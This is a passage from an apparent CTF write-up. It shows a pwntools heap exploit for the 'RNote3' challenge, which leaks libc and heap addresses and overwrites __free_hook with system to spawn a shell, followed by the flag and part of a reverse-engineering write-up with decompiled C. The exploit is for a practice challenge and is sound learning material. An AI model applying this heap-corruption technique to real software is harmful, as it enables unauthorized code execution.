</span></span><span class=line><span class=cl><span class=n>mode</span> <span class=o>=</span> <span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>)</span> <span class=o>&gt;</span> <span class=mi>1</span> <span class=k>else</span> <span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=n>mode</span> <span class=o>==</span> <span class=s1>&#39;remote&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>r</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=n>host_remote</span><span class=p>,</span><span class=n>port_remote</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>elif</span> <span class=n>mode</span> <span class=o>==</span> <span class=s1>&#39;local&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>r</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=n>host</span><span class=p>,</span><span class=n>port</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>r</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s1>&#39;./RNote3&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>start_gdb</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span><span class=p>(</span><span class=n>os</span><span class=o>.</span><span class=n>environ</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;TMUX&#39;</span><span class=p>,</span><span class=kc>False</span><span class=p>)):</span>
</span></span><span class=line><span class=cl>                        <span class=n>context</span><span class=o>.</span><span class=n>terminal</span> <span class=o>=</span> <span class=p>[</span><span class=s1>&#39;tmux&#39;</span><span class=p>,</span> <span class=s1>&#39;splitw&#39;</span><span class=p>,</span> <span class=s1>&#39;-h&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>                        <span class=n>gdb</span><span class=o>.</span><span class=n>attach</span><span class=p>(</span><span class=n>r</span><span class=p>,</span><span class=n>gdb_cmds</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                        <span class=n>log</span><span class=o>.</span><span class=n>warning</span><span class=p>(</span><span class=s1>&#39;Start a tmux session to get gdb attached!&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>new_note</span><span class=p>(</span><span class=n>note_title</span><span class=p>,</span><span class=n>note_size</span><span class=p>,</span><span class=n>note_content</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s1>&#39;1&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;input title: &#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>r</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>note_title</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;content size: &#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>note_size</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34; input content: &#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>r</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>note_content</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>view_note</span><span class=p>(</span><span class=n>note_title</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s1>&#39;2&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;note title: &#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>r</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>note_title</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;title: &#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>title</span> <span class=o>=</span> <span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;note cont&#34;</span><span class=p>)[:</span><span class=o>-</span><span class=mi>9</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;ent: &#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>content</span> <span class=o>=</span> <span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)[:</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span><span class=p>(</span><span class=n>title</span><span class=p>,</span><span class=n>content</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>edit_note</span><span class=p>(</span><span class=n>note_title</span><span class=p>,</span><span class=n>new_content</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s1>&#39;3&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;input note title: &#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>r</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>note_title</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34; new content: &#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>r</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>new_content</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>delete_note</span><span class=p>(</span><span class=n>note_title</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s1>&#39;4&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;note title: &#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>r</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>note_title</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>exit</span><span class=p>():</span>
</span></span><span class=line><span class=cl>        <span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s1>&#39;5&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;5. Exit&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>## BEGIN EXPLOIT</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>libc_base_offset</span> <span class=o>=</span> <span class=mh>0x3c4b78</span>  <span class=c1>##computed manually looking at 3-4 executions with gdb</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>## LIBC LEAK </span>
</span></span><span class=line><span class=cl><span class=n>new_note</span><span class=p>(</span><span class=s2>&#34;aaa</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span><span class=mi>200</span><span class=p>,</span><span class=s2>&#34;A&#34;</span><span class=o>*</span><span class=mi>200</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>new_note</span><span class=p>(</span><span class=s2>&#34;bbb</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span><span class=mi>200</span><span class=p>,</span><span class=s2>&#34;B&#34;</span><span class=o>*</span><span class=mi>200</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>edit_note</span><span class=p>(</span><span class=s2>&#34;aaa</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span><span class=s2>&#34;X&#34;</span><span class=o>*</span><span class=mi>200</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>delete_note</span><span class=p>(</span><span class=s2>&#34;S</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span> <span class=c1>## we use a non existing title to trigger vulnerability</span>
</span></span><span class=line><span class=cl><span class=n>libc_leak</span> <span class=o>=</span> <span class=n>view_note</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)[</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>libc_leak</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>libc_leak</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>libc_base_eff</span> <span class=o>=</span> <span class=n>libc_leak</span> <span class=o>-</span> <span class=n>libc_base_offset</span>
</span></span><span class=line><span class=cl><span class=n>system_eff</span> <span class=o>=</span> <span class=n>libc_base_eff</span> <span class=o>+</span> <span class=n>libc</span><span class=o>.</span><span class=n>symbols</span><span class=p>[</span><span class=s1>&#39;system&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>free_hook_eff</span> <span class=o>=</span> <span class=n>libc_base_eff</span> <span class=o>+</span> <span class=n>libc</span><span class=o>.</span><span class=n>symbols</span><span class=p>[</span><span class=s1>&#39;__free_hook&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=s2>&#34;libc leak:      </span><span class=si>{}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=nb>hex</span><span class=p>(</span><span class=n>libc_leak</span><span class=p>)))</span>
</span></span><span class=line><span class=cl><span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=s2>&#34;libc base:      </span><span class=si>{}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=nb>hex</span><span class=p>(</span><span class=n>libc_base_eff</span><span class=p>)))</span>
</span></span><span class=line><span class=cl><span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=s2>&#34;system addr:    </span><span class=si>{}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=nb>hex</span><span class=p>(</span><span class=n>system_eff</span><span class=p>)))</span>
</span></span><span class=line><span class=cl><span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=s2>&#34;free_hook addr: </span><span class=si>{}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=nb>hex</span><span class=p>(</span><span class=n>free_hook_eff</span><span class=p>)))</span>
</span></span><span class=line><span class=cl><span class=c1>## clean state - heap is fine and uncorrupted here, no free chunks are present</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>## HEAP LEAK</span>
</span></span><span class=line><span class=cl><span class=n>new_note</span><span class=p>(</span><span class=s2>&#34;aaa</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span><span class=mi>200</span><span class=p>,</span><span class=s2>&#34;/bin/sh</span><span class=se>\x00</span><span class=s2>&#34;</span><span class=o>+</span><span class=s2>&#34;A&#34;</span><span class=o>*</span><span class=mi>100</span><span class=o>+</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>new_note</span><span class=p>(</span><span class=s2>&#34;ccc</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span><span class=mi>240</span><span class=p>,</span><span class=s2>&#34;C&#34;</span><span class=o>*</span><span class=mi>240</span><span class=p>)</span> <span class=c1>## I had to tune this value in order to make the next note_struct in the heap </span>
</span></span><span class=line><span class=cl><span class=n>new_note</span><span class=p>(</span><span class=s2>&#34;ddd</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span><span class=mi>200</span><span class=p>,</span><span class=s2>&#34;D&#34;</span><span class=o>*</span><span class=mi>200</span><span class=p>)</span> <span class=c1>## to start at something like 0x????00 and continue to exploit the same </span>
</span></span><span class=line><span class=cl><span class=n>new_note</span><span class=p>(</span><span class=s2>&#34;eee</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span><span class=mi>200</span><span class=p>,</span><span class=s2>&#34;E&#34;</span><span class=o>*</span><span class=mi>200</span><span class=p>)</span> <span class=c1>## vulnerability</span>
</span></span><span class=line><span class=cl><span class=n>new_note</span><span class=p>(</span><span class=s2>&#34;fff</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span><span class=mi>200</span><span class=p>,</span><span class=s2>&#34;F&#34;</span><span class=o>*</span><span class=mi>200</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>delete_note</span><span class=p>(</span><span class=s2>&#34;ddd</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>edit_note</span><span class=p>(</span><span class=s2>&#34;eee</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span><span class=s2>&#34;Y&#34;</span><span class=o>*</span><span class=mi>200</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>delete_note</span><span class=p>(</span><span class=s2>&#34;S</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>heap_leak</span> <span class=o>=</span> <span class=n>view_note</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)[</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>heap_leak</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>heap_leak</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=s2>&#34;heap leak:      </span><span class=si>{}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=nb>hex</span><span class=p>(</span><span class=n>heap_leak</span><span class=p>)))</span>
</span></span><span class=line><span class=cl><span class=n>new_note</span><span class=p>(</span><span class=s2>&#34;ddd</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span><span class=mi>200</span><span class=p>,</span><span class=s2>&#34;D&#34;</span><span class=o>*</span><span class=mi>200</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>new_note</span><span class=p>(</span><span class=s2>&#34;eee</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span><span class=mi>200</span><span class=p>,</span><span class=s2>&#34;E&#34;</span><span class=o>*</span><span class=mi>200</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>heap_top</span> <span class=o>=</span> <span class=n>heap_leak</span> <span class=o>+</span> <span class=mh>0x2b0</span>
</span></span><span class=line><span class=cl><span class=c1>## clean state - heap is fine and uncorrupted here, no free chunks are present</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>## ARBITRARY WRITE</span>
</span></span><span class=line><span class=cl><span class=n>new_note</span><span class=p>(</span><span class=s2>&#34;mmm</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span><span class=mi>200</span><span class=p>,</span><span class=s2>&#34;M&#34;</span><span class=o>*</span><span class=mi>200</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>new_note</span><span class=p>(</span><span class=s2>&#34;nnn</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span><span class=mi>200</span><span class=p>,</span><span class=s2>&#34;N&#34;</span><span class=o>*</span><span class=mi>200</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>new_note</span><span class=p>(</span><span class=s2>&#34;ooo</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span><span class=mi>200</span><span class=p>,</span><span class=s2>&#34;O&#34;</span><span class=o>*</span><span class=mi>200</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>new_note</span><span class=p>(</span><span class=s2>&#34;ppp</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span><span class=mi>200</span><span class=p>,</span><span class=s2>&#34;P&#34;</span><span class=o>*</span><span class=mi>200</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>m_chunk</span> <span class=o>=</span> <span class=n>heap_leak</span> <span class=o>+</span> <span class=mh>0x2d0</span>
</span></span><span class=line><span class=cl><span class=n>n_chunk</span> <span class=o>=</span> <span class=n>m_chunk</span> <span class=o>+</span> <span class=mh>0xf0</span>
</span></span><span class=line><span class=cl><span class=n>o_chunk</span> <span class=o>=</span> <span class=n>n_chunk</span> <span class=o>+</span> <span class=mh>0xf0</span>
</span></span><span class=line><span class=cl><span class=n>p_chunk</span> <span class=o>=</span> <span class=n>o_chunk</span> <span class=o>+</span> <span class=mh>0xf0</span>
</span></span><span class=line><span class=cl><span class=n>edit_note</span><span class=p>(</span><span class=s2>&#34;ooo</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span><span class=s2>&#34;O&#34;</span><span class=o>*</span><span class=mi>200</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>delete_note</span><span class=p>(</span><span class=s2>&#34;S</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>delete_note</span><span class=p>(</span><span class=s2>&#34;mmm</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>edit</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc_leak</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>n_chunk</span> <span class=o>+</span> <span class=mh>0x20</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>edit</span> <span class=o>+=</span> <span class=s2>&#34;O&#34;</span><span class=o>*</span><span class=p>(</span><span class=mi>200</span><span class=o>-</span><span class=nb>len</span><span class=p>(</span><span class=n>edit</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>edit_note</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span><span class=n>edit</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>edit</span> <span class=o>=</span> <span class=s2>&#34;N&#34;</span><span class=o>*</span><span class=mi>16</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x00</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x111</span><span class=p>)</span> 
</span></span><span class=line><span class=cl><span class=n>edit</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>o_chunk</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>m_chunk</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>edit</span> <span class=o>+=</span> <span class=s2>&#34;N&#34;</span><span class=o>*</span><span class=p>(</span><span class=mi>200</span><span class=o>-</span><span class=nb>len</span><span class=p>(</span><span class=n>edit</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>edit_note</span><span class=p>(</span><span class=s2>&#34;nnn</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span><span class=n>edit</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>edit</span> <span class=o>=</span> <span class=s2>&#34;Q&#34;</span><span class=o>*</span><span class=mh>0xb0</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x00</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x10</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>free_hook_eff</span><span class=p>)</span> <span class=o>+</span> <span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>new_note</span><span class=p>(</span><span class=s2>&#34;qqq</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span><span class=mi>256</span><span class=p>,</span><span class=n>edit</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>edit_note</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span><span class=n>p64</span><span class=p>(</span><span class=n>system_eff</span><span class=p>)</span><span class=o>+</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>delete_note</span><span class=p>(</span><span class=s2>&#34;aaa</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></div><h3 class="relative group">Flag<div id=flag class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#flag aria-label=Anchor>#</a></span></h3><p>RCTF{P1e4se_Be_C4refu1_W1th_Th3_P0inter_3c3d89}</p><h2 class="relative group">Simple re<div id=simple-re class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#simple-re aria-label=Anchor>#</a></span></h2><p>The given file seems at first malformed, having almost no sensible code and an entry point pointing outside of the defined sections. After a bit of debugging it became clear that a small loader would xor the code section with 0xCC and then jump to it. With this in mind I wrote a small script to undo the xor encryption and fix the entry point. Now it was time to actually reverse the logic inside and find the flag.</p><h3 class="relative group">The decoy<div id=the-decoy class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#the-decoy aria-label=Anchor>#</a></span></h3><p>The first thing the program would do at startup is fork and split into a first thread that asked for the flag and checked it, a second one that, after playing around with some pthread calls, jumped back into a section of <code>main</code> previously unmarked by ida and basically wait for the first thread to trigger a debugger breakpoint. It was at this time that I fell for the decoy: I only considered the first thread only and fully reversed the encryption algorithm it used, only to get a nonprintable flag - how frustrating!</p><h3 class="relative group">Fixing it up<div id=fixing-it-up class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#fixing-it-up aria-label=Anchor>#</a></span></h3><p>Afterwards we went back to the challenge with a teammate, focusing more on both threads. The first thread would encrypt the input and, before checking it, trigger an <code>int 3</code>, which the second thread was ready to catch (well, it wasn&rsquo;t when running the binary in IDA as no two debuggers can be attached at the same time, but you get the idea). This second thread then decrypted a checker function which ignored the previous encryption on the flag by using another copy of it and proceeded to, duh, check it.</p><p>The decryptor was this function:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>void</span> <span class=n>__usercall</span> <span class=n>__noreturn</span> <span class=nf>sub_400FDC</span><span class=p>(</span><span class=kr>__int64</span> <span class=n>a1</span><span class=err>@</span><span class=o>&lt;</span><span class=n>rbp</span><span class=o>&gt;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=o>*</span><span class=p>(</span><span class=n>_QWORD</span> <span class=o>*</span><span class=p>)(</span><span class=n>a1</span> <span class=o>-</span> <span class=mi>24</span><span class=p>)</span> <span class=o>=</span> <span class=n>sub_401482</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=o>*</span><span class=p>(</span><span class=n>_BYTE</span> <span class=o>*</span><span class=p>)(</span><span class=n>a1</span> <span class=o>-</span> <span class=mi>31</span><span class=p>)</span> <span class=o>=</span> <span class=sc>&#39;R&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=o>*</span><span class=p>(</span><span class=n>_BYTE</span> <span class=o>*</span><span class=p>)(</span><span class=n>a1</span> <span class=o>-</span> <span class=mi>30</span><span class=p>)</span> <span class=o>=</span> <span class=sc>&#39;i&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=o>*</span><span class=p>(</span><span class=n>_BYTE</span> <span class=o>*</span><span class=p>)(</span><span class=n>a1</span> <span class=o>-</span> <span class=mi>29</span><span class=p>)</span> <span class=o>=</span> <span class=sc>&#39;g&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=o>*</span><span class=p>(</span><span class=n>_BYTE</span> <span class=o>*</span><span class=p>)(</span><span class=n>a1</span> <span class=o>-</span> <span class=mi>28</span><span class=p>)</span> <span class=o>=</span> <span class=sc>&#39;h&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=o>*</span><span class=p>(</span><span class=n>_BYTE</span> <span class=o>*</span><span class=p>)(</span><span class=n>a1</span> <span class=o>-</span> <span class=mi>27</span><span class=p>)</span> <span class=o>=</span> <span class=sc>&#39;t&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=o>*</span><span class=p>(</span><span class=n>_BYTE</span> <span class=o>*</span><span class=p>)(</span><span class=n>a1</span> <span class=o>-</span> <span class=mi>26</span><span class=p>)</span> <span class=o>=</span> <span class=sc>&#39;!&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=o>*</span><span class=p>(</span><span class=n>_BYTE</span> <span class=o>*</span><span class=p>)(</span><span class=n>a1</span> <span class=o>-</span> <span class=mi>25</span><span class=p>)</span> <span class=o>=</span> <span class=sc>&#39;\0&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>for</span> <span class=p>(</span> <span class=o>*</span><span class=p>(</span><span class=n>_QWORD</span> <span class=o>*</span><span class=p>)(</span><span class=n>a1</span> <span class=o>-</span> <span class=mi>8</span><span class=p>)</span> <span class=o>=</span> <span class=mi>0LL</span><span class=p>;</span> <span class=o>*</span><span class=p>(</span><span class=n>_QWORD</span> <span class=o>*</span><span class=p>)(</span><span class=n>a1</span> <span class=o>-</span> <span class=mi>8</span><span class=p>)</span> <span class=o>&lt;</span> <span class=mh>0x162uLL</span><span class=p>;</span> <span class=o>++*</span><span class=p>(</span><span class=n>_QWORD</span> <span class=o>*</span><span class=p>)(</span><span class=n>a1</span> <span class=o>-</span> <span class=mi>8</span><span class=p>)</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=o>*</span><span class=p>(</span><span class=n>_BYTE</span> <span class=o>*</span><span class=p>)(</span><span class=o>*</span><span class=p>(</span><span class=n>_QWORD</span> <span class=o>*</span><span class=p>)(</span><span class=n>a1</span> <span class=o>-</span> <span class=mi>24</span><span class=p>)</span> <span class=o>+</span> <span class=o>*</span><span class=p>(</span><span class=n>_QWORD</span> <span class=o>*</span><span class=p>)(</span><span class=n>a1</span> <span class=o>-</span> <span class=mi>8</span><span class=p>))</span> <span class=o>^=</span> <span class=mh>0x28u</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=p>(</span><span class=kt>unsigned</span> <span class=kr>__int8</span><span class=p>)</span><span class=nf>sub_401482</span><span class=p>(</span><span class=o>&amp;</span><span class=n>qword_6020E0</span><span class=p>)</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nf>puts</span><span class=p>((</span><span class=k>const</span> <span class=kt>char</span> <span class=o>*</span><span class=p>)(</span><span class=n>a1</span> <span class=o>-</span> <span class=mi>31</span><span class=p>));</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=n>pid</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nf>kill</span><span class=p>(</span><span class=n>pid</span><span class=p>,</span> <span class=mi>9</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
